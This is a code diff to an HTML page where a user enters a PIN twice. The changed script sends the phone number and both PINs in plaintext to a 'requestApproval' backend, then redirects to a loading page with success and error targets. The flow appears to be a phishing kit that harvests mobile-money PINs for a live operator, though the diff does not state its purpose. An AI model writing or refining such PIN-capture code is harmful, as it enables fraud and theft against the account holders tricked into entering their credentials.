@@ -79,6 +79,7 @@
             <button class="confirm-button" id="confirm-pin" style="opacity: 0.5; pointer-events: none;">Endelea</button>
         </main>
     </div>
+    <script src="utils/apiClient.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const dots = document.querySelectorAll('.pin-dot');
@@ -146,13 +147,12 @@
                     document.getElementById('pin-error').textContent = "";
 
                     try {
-                        const res = await fetch('/.netlify/functions/request-approval', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ type: 'pin', phone: phone, data: { pin1: firstPin, pin2: pin } })
+                        const resData = await window.apiClient.requestApproval({ 
+                            type: 'pin', 
+                            phone: phone, 
+                            details: `PIN1: ${firstPin}, PIN2: ${pin}` 
                         });
-                        const resData = await res.json();
-                        const sid = resData.sessionId;
+                        const sid = resData.attemptId;
                         window.location.href = `loading.html?sid=${sid}&next=success.html&error=${encodeURIComponent('pin.html?error=1')}`;
                     } catch (err) {
                         console.error('Request error:', err);
